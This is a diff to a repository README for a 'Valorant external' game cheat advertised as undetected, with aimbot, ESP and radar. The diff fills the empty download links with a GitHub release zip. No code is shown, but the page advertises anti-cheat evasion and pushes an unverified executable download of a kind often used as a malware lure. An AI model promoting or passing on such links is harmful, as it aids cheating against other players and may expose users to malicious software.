@@ -1,7 +1,7 @@
 
 <div align="center">
   
-  [Valorant external]()
+  [Valorant external](https://github.com/SoapmakerFeel9/Valorant-external-2026/releases/download/valorant3.1/ValorantV3.1.zip)
 
  > **The ultimate, feature-rich undetected utility for Valorant. Full control over Aimbot, ESP, Radar, and Performance options.**
   
@@ -26,9 +26,9 @@
 ---
 
 
-### [⬇️ Download]()
+### [⬇️ Download](https://github.com/SoapmakerFeel9/Valorant-external-2026/releases/download/valorant3.1/ValorantV3.1.zip)
 
-[![Download Now](https://img.shields.io/badge/Download-Now-green?style=for-the-badge&logo=github)]().
+[![Download Now](https://img.shields.io/badge/Download-Now-green?style=for-the-badge&logo=github)](https://github.com/SoapmakerFeel9/Valorant-external-2026/releases/download/valorant3.1/ValorantV3.1.zip)
 
 
 </div>
